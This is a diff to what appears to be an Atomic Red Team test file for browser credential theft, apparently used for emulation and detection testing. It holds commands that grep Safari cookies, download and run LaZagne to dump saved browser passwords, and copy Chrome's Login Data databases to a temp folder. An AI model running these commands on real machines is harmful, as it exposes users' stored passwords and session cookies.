@@ -44,29 +44,25 @@ atomic_tests:
   input_arguments:
     search_string:
       description: String to search Safari cookies to find.
-      type: string
+      type: String
       default: coinbase
   executor:
     command: |
       cd ~/Library/Cookies
       grep -q "#{search_string}" "Cookies.binarycookies"
     name: sh
-
 - name: LaZagne - Credentials from Browser
   auto_generated_guid: 9a2915b3-3954-4cce-8c76-00fbf4dbd014
   description: |
     The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.
     LaZagne is an open source application used to retrieve passwords stored on a local computer. 
-
   supported_platforms:
     - windows
-
   input_arguments:
     lazagne_path:
       description: Path to LaZagne
       type: Path
       default: PathToAtomicsFolder\T1555.003\bin\LaZagne.exe
-  
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -76,9 +72,33 @@ atomic_tests:
     get_prereq_command: |
       New-Item -Type Directory (split-path #{lazagne_path}) -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "#{lazagne_path}"
-      
   executor:
     name: command_prompt
     elevation_required: true
     command: |
       #{lazagne_path} browsers
+- name: Simulating access to Chrome Login Data
+  auto_generated_guid: 3d111226-d09a-4911-8715-fe11664f960d
+  description: |
+    Simulates an adversary accessing encrypted credentials from Google Chrome Login database. 
+  supported_platforms:
+    - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Chrome must be installed
+    prereq_command: 'if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe") -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")) {exit 0} else {exit 1}'
+    get_prereq_command: | 
+      $installer = "$env:temp\ChromeStandaloneSetup64.msi"
+      Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.msi https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
+      msiexec /i $installer /qn
+      Start-Process -FilePath "chrome.exe"
+      Stop-Process -Name "chrome"
+  executor:
+    name: powershell
+    command: |
+      Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination $env:temp
+      Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -Destination $env:temp
+    cleanup_command: |
+      Remove-Item -Path "$env:temp\Login Data" -Force -ErrorAction Ignore
+      Remove-Item -Path "$env:temp\Login Data For Account" -Force -ErrorAction Ignore
